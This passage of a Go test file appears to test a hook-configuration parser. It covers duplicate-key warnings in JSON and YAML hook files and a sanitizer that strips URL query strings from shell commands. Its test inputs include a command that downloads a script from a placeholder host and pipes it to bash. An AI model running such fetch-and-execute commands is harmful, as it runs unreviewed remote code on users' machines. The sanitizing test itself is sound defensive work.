	raw := []byte(`{"hooks":{"stop":[],"Stop":[],"stop":[]},"Hooks":{}}`)
	_, warnings, err := DecodeJSON(raw, StrictJSON, "Copilot", "hooks")
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(warnings, "\n")
	if strings.Contains(joined, `"stop" and "Stop"`) || !strings.Contains(joined, `duplicate key "stop"`) || !strings.Contains(joined, `"hooks" and "Hooks"`) {
		t.Fatalf("warnings = %v", warnings)
	}
	_, warnings, err = DecodeYAML([]byte("hooks:\n  stop: 1\n  Stop: 2\n"), "Copilot", "hooks")
	if err != nil || len(warnings) != 0 {
		t.Fatalf("yaml warnings = %v err %v", warnings, err)
	}
}

// TestSanitizeURLStopsAtSubstitution checks that a URL ends at a
// backtick or ")", so the command substitution around it still closes
// after its query is stripped.
func TestSanitizeURLStopsAtSubstitution(t *testing.T) {
	src := source(model.ScopeRepo, ".codex/hooks.json")
	for in, want := range map[string]string{
		"echo `curl https://e.example.invalid/x?sig=abc`":                                "echo `curl https://e.example.invalid/x`",
		`bash -c "$(curl -fsSL https://e.example.invalid/i.sh)"`:                         `bash -c "$(curl -fsSL https://e.example.invalid/i.sh)"`,
		"x=$(curl https://e.example.invalid/?k=v) && `curl https://e.example.invalid/y`": "x=$(curl https://e.example.invalid/) && `curl https://e.example.invalid/y`",
	} {
		if got := src.SafeString(in); got != want {
			t.Errorf("SafeString(%q) = %q, want %q", in, got, want)
		}
	}
}
